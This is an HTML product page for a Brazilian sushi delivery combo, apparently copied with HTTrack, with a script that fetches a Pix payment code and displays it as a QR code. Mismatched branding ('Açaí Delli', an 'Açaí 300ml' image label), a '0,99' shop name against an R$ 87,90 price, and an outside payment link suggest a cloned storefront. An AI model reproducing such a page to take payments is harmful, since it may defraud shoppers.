<html lang="pt-br" translate="no"><head></head><body>

<meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8">

<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>

	<meta name="google" content="notranslate">
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="shortcut icon" type="image/jpg" href="images/logo.webp">
	<title>Noaki 0,99 Sushi Delivery - Faça seu pedido!</title>
	<meta name="description" content="Faça seu pedido online no Noaki 0,99 Sushi Delivery. Acesse e peça agora pelo delivery Contatei!">
	<link type="text/css" href="css/delivry.css" rel="stylesheet">
	<style type="text/css">
		h1,
		h2 {
			color: #000000;
		}

		header#topo .cover {
			background-color: #000000;
		}

		header#topo .info h1 {
			color: #000000;
		}

		header#topo .info .icones a {
			color: #000000;
			border-color: #000000;
		}

		header#topo .cover .logo {
			background: #000000;
		}

		header#topo #menuCategorias {
			background: #000000;
		}

		header#topo .categorias a {
			border-top-color: #000000;
		}

		footer {
			background: #000000;
		}

		footer#carrinho .container .icone span {
			color: #000000;
		}

		.btn,
		a.voltar,
		.btnSair,
		.btnFidelidade,
		.btnGoogle,
		.btnEmail,
		.btnSemCadastro {
			background: #000000;
		}

		.qtdeProduto i:hover {
			color: #000000;
		}

		.lista .item .col .nomeProduto {
			color: #000000;
		}

		main#lista .produtos .item a:hover {
			border: 2px solid #000000;
		}

		#pedido .entrega .radio label input[type=radio]:checked,
		#pedido .entrega .radio label:hover {
			background: #000000;
		}

		#pedido .pagamentos input[type=radio]:checked+label::before,
		#detalhesProduto .info2 .opcoes input[type=checkbox]:checked+label::before,
		#pedido .trocarPontos input[type=checkbox]:checked+label::before {
			background-color: #000000;
			border: 2px solid #000000;
		}

		.selecionado {
			border: 2px solid #000000;
		}

		#meuCarrinho button.fechar,
		#rastreamento .registro span.passou {
			background: #000000;
		}

		span.estoque i {
			color: #000000;
		}
	</style>
	<meta name="theme-color" content="#000000">
	<meta name="apple-mobile-web-app-capacity" content="yes">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar" content="#000000">
	<meta name="apple-mobile-web-app-status-bar-style" content="#000000">
	<meta name="apple-mobile-web-app-title" content="Açaí Delli">
	<!-- SweetAlert2 -->
	<script src="sweetalert2%254011.html"></script>
	<link rel="stylesheet" href="icone91f.html">
	


	<div id="opacidade" class="fechar"></div>
	<div>
		<div class="container containerFinalizar">
			<a class="voltar" href="../../../index.html" title="Voltar"><i class="fa-solid fa-chevron-left"></i>
				VOLTAR</a>
			<div id="detalhesProduto">
				<div class="info1">
					<div class="somarAoPreco" style="display:none">s</div>
					<div class="fotoProduto">
						<figure>
							<img src="images/combinado2.webp" width="300px" height="300px" alt="Açaí 300ml">
						</figure>
					</div>
					<div class="descricao">
						<h3>Combinado Maçaricado 44 (Peças)</h3>
						<span class="detalhe">Combo composto por 14 Hot Roll 10 Niguiri Salmao, 10 Dyo de Salmao, 10 Sashimi Salmao. Combo totalmente massaricado, nada cru. Para saciar sua vontade de comida japonesa! Acompanha 30ml de shoyo, 15g de wasabi, 15g de gari.</span>
						por
						<span class="preco">
							R$ 87,90<span style="display:none;">87.90</span>
						</span>
					</div>
				</div>
				<div class="info2">
					
					<div id="complementos-gratis" class="tipo" data-id="15313" data-calculo="n" data-minimo="0" data-maximo="1" data-opcional="n">
						<div class="topo">
							<div>
								<h3>Kit Delivery</h3>
								<span class="detalhe">
									Escolha 1 opção </span>
							</div>
							<div class="col2">
								<span class="escolhidos"><span>0</span>/1</span>
								<i class="fa-solid fa-circle-check" style="display: inline"></i>
							</div>
						</div>
						<div class="opcoes" data-id="118806">
							<div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
								<span class="nome" style="">
									<b>Hashi e Guardanapo</b>
									<span class="detalheOpcao" style="padding-right:10px"></span>
									<span class="preco"><span style="display:none;">0.00</span></span>
								</span>
								<div class="qtdeProdutoOpcao">
									<button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
									<input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
									<button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
								</div>
							</div>
						</div>
						<div class="opcoes" data-id="118812">
							<div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
								<span class="nome" style="">
									<b>Não, obrigado!</b>
									<span class="detalheOpcao" style="padding-right:10px"></span>
									<span class="preco"><span style="display:none;">0.00</span></span>
								</span>
								<div class="qtdeProdutoOpcao">
									<button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
									<input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
									<button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
								</div>
							</div>
						</div>
						
					</div>
					<div id="complementos-gratis" class="tipo" data-id="15313" data-calculo="n" data-minimo="0" data-maximo="1" data-opcional="n">
						<div class="topo">
							<div>
								<h3>Brinde no 1º pedido:</h3>
								<span class="detalhe">
									Escolha até 1 opção </span>
							</div>
							<div class="col2">
								<span class="escolhidos"><span>0</span>/1</span>
								<i class="fa-solid fa-circle-check" style="display: inline"></i>
							</div>
						</div>
						<div class="opcoes" data-id="118806">
							<div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
								<span class="nome" style="">
									<b>Bis (3 un)</b>
									<span class="detalheOpcao" style="padding-right:10px"></span>
									<span class="preco">Grátis no 1º pedido<span style="display:none;">0.00</span></span>
								</span>
								<div class="qtdeProdutoOpcao">
									<button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
									<input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
									<button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
								</div>
							</div>
						</div>
						<div class="opcoes" data-id="118812">
							<div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
								<span class="nome" style="">
									<b>Bombom Sonho de Valsa (1 un)</b>
									<span class="detalheOpcao" style="padding-right:10px"></span>
									<span class="preco">Grátis no 1º pedido<span style="display:none;">0.00</span></span>
								</span>
								<div class="qtdeProdutoOpcao">
									<button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
									<input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
									<button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
								</div>
							</div>
						</div>
					</div>
					
					<div class="overlay"></div>
					<div class="imagem-ampliada">
						<img src="#" alt="">
						<button class="fechar"><i class="fa-solid fa-xmark"></i></button>
					</div>
					<label>Adicionar algum detalhe?</label>
					<input class="observacao" type="text" name="observacao" placeholder="Escreva o detalhe aqui ..." maxlength="140">
					<em><span>0</span>/140</em>
				</div>
				<div class="info3">
					<input id="idProduto" type="hidden" name="idProduto" value="12111">
					<!--<div class="qtdeProduto" style="display:none">-->
					<div class="qtdeProduto" style="display: none;">
						<button class="removerQtde" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
						<input class="qtde" type="text" value="1" min="1" max="86" size="3" disabled="">
						<button class="adicionarQtde" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
					</div>
					<div id="precoProduto">R$ 0,00</div>
					<span class="precoProduto" style="display:none">14.00</span>
					<button class="btn adicionarProduto" onclick="finalizar()">FINALIZAR PEDIDO</button>
					<a href="https://pay.deliverysushipagamentos.online/a9ArZMl72KQ37xj" id="finalizarPedido" style="display: none;"></a>
				</div>
			</div>
			
			<!-- Modal PIX (já deve existir no seu HTML). Se não existir, adicione: -->
<div id="pixModal" role="dialog" aria-modal="true" aria-hidden="true" style="position:fixed;inset:0;background:rgba(0,0,0,.55);display:none;align-items:center;justify-content:center;z-index:9999;">
  <div class="box" style="width:min(92vw,520px);background:#fff;border-radius:10px;padding:20px;box-shadow:0 10px 30px rgba(0,0,0,.2);">
    <h3 style="margin:0 0 12px;font-size:18px;">Pagamento via Pix</h3>
    <div class="qr" style="display:flex;justify-content:center;margin:10px 0 14px;"><div id="pixQr"></div></div>
    <div id="pixCode" style="word-break:break-word;max-height:160px;overflow:auto;font-size:14px;"></div>
    <div class="actions" style="display:flex;gap:10px;margin-top:14px;">
      <button id="btnCopyPix" style="flex:1;border:0;padding:10px 12px;border-radius:6px;color:#fff;background:#0d6efd;cursor:pointer;">Copiar código Pix</button>
      <button id="btnClosePix" style="flex:1;border:0;padding:10px 12px;border-radius:6px;color:#fff;background:#6c757d;cursor:pointer;">Fechar</button>
    </div>
  </div>
</div>

<!-- Lib de QR Code -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js" defer></script>

<script>
  // ===== helpers =====
  function getProductInfo() {
    const name = document.querySelector('#detalhesProduto .descricao h3')?.textContent?.trim() || 'Produto';
    // tenta número "limpo" do span escondido (ex.: 87.90)
    let amount = parseFloat(
      document.querySelector('#detalhesProduto .descricao .preco span[style*="display:none"]')?.textContent?.trim() || ''
    );
    if (!isFinite(amount)) {
      // fallback: parse do "R$ 87,90"
      const vis = document.querySelector('#detalhesProduto .descricao .preco')?.textContent || '';
      const n = vis.replace(/[^\d,.-]/g, '').replace(/\./g, '').replace(',', '.');
      amount = parseFloat(n);
    }
    return { name, amount: isFinite(amount) ? amount : 0 };
  }

  async function emitirPix(amount, description) {
    const resp = await fetch('/api/pix/emit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ amount, description })
    });
    // se a função não existir ou erro de CORS/rota, isso ajuda a depurar:
    console.log('Resposta /api/pix/emit -> status:', resp.status);
    const json = await resp.json().catch(() => ({}));
    if (!resp.ok || json.success === false) {
      throw new Error(json?.message || `Falha ao emitir Pix (HTTP ${resp.status})`);
    }
    if (!json?.data?.qrcode) throw new Error('Resposta sem qrcode.');
    return json.data.qrcode;
  }

  function openPixModal(payload) {
    const qrWrap = document.getElementById('pixQr');
    qrWrap.innerHTML = '';
    try { new QRCode(qrWrap, { text: payload, width: 240, height: 240 }); }
    catch(e) { console.error('QRCode error', e); alert('Falha ao gerar QR.'); return; }

    document.getElementById('pixCode').textContent = payload;

    document.getElementById('btnCopyPix').onclick = async () => {
      try { await navigator.clipboard.writeText(payload); alert('Código Pix copiado!'); }
      catch { alert('Não foi possível copiar automaticamente.'); }
    };
    document.getElementById('btnClosePix').onclick = () => closePixModal();

    const modal = document.getElementById('pixModal');
    modal.style.display = 'flex';
    modal.setAttribute('aria-hidden', 'false');
  }

  function closePixModal() {
    const modal = document.getElementById('pixModal');
    modal.style.display = 'none';
    modal.setAttribute('aria-hidden', 'true');
  }

  // ===== fluxo do botão FINALIZAR PEDIDO =====
  window.finalizar = async function () {  // <- garante função global pro onclick
    console.log('[finalizar] clique detectado');
    try {
      const { name, amount } = getProductInfo();
      console.log('[finalizar] produto:', name, 'valor:', amount);
      if (!amount || amount < 1) {
        alert('Não foi possível identificar o valor do produto.');
        return;
      }
      const payload = await emitirPix(amount, `Pedido: ${name}`);
      openPixModal(payload);
    } catch (e) {
      console.error(e);
      alert(e.message || 'Não foi possível gerar o Pix agora.');
    }
  };
</script>

			
		</div>
	</div>
	<script type="text/javascript" src="js/jquery.js"></script>
	<script type="text/javascript" src="js/deliveryProduto.js"></script>

	<script src="js/all.js" data-auto-replace-svg="nest" defer="" type="text/javascript"></script>
	<script type="text/javascript" src="js/jquery-mask.js" defer=""></script>

	<script src="js/sweetalert.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>




</body></html>